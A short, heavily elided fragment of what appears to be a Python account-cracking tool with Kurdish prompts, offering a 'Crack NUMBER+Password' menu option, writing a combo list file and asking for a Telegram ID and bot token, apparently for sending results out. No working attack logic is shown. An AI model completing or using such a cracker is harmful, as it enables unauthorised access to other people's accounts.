...
banek='''\x1b[1;97m
 [\033[31m1\x1b[1;97m] Crack NUMBER+Password
...
def aco():
	reb = input(' Halbzhera [2] bashtra ==> ')
	print(num)
	
	if reb=='1':
		sfr = input(' \x1b[1;36mKamyan Hack bkam :\033[32m ')
		op=open('combo.txt','w')
...
print(logo)
print(logo2)
id_tg =input(' ID TELEGRAM BNWSA : ')
token_bot=input(' TOKINE BOT TELEGRAM: ')
time.sleep(0.5)
menu()
